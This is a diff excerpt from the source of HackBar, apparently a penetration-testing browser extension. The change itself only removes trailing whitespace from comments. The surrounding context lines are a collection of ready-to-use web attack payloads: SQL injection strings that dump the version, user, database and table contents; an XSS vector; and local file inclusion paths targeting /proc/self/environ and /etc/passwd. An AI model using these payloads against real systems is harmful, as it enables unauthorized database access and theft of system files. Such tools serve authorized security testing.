@@ -617,7 +617,7 @@ HackBar.SQL = {
                 }
                 txt = "concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x))";
                 break;
-                // join method          
+                // join method
             case 'Join Method':
                 txt = "union select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d join(select 5)e join(select 6)f join(select 7)g join(select 8)h join(select 9)i join(select 10)j join(select  11)k join(select 12)l join(select 13)m join(select 14)n join(select 15)o join(select 16)p join(select 17)q join(select 18)r join(select 19)s join(select 20)t join(select 21)u";
                 break;
@@ -1493,7 +1493,7 @@ HackBar.SQL = {
             case 'FIX POINT75':
                 txt = "and x(point(0,0)) -- -";
                 break;
-                //Brute xss 
+                //Brute xss
             case 'brutexss1':
                 txt = "<svg/onload=alert()>";
                 break;
@@ -2026,7 +2026,7 @@ HackBar.SQL = {
             case 'lfi657':
                 txt = "../../../../../../../../../../../../proc/self/environ%00";
                 break;
-                //LFI Payload 
+                //LFI Payload
             case 'file_wrapper':
                 txt = "file:///etc/passwd";
                 break;
@@ -2289,7 +2289,7 @@ HackBar.SQL = {
                 var value = prompt("Please Enter the value of convert statement", "version()");
                 txt = "CONVERT(concat(" + value + "),binary)";
                 break;
-                //conver using substring      
+                //conver using substring
             case 'substring 1':
                 var value = prompt("Please Enter the value of convert statement", "version()");
                 txt = "substring(concat(" + value + "),1,1)=4";
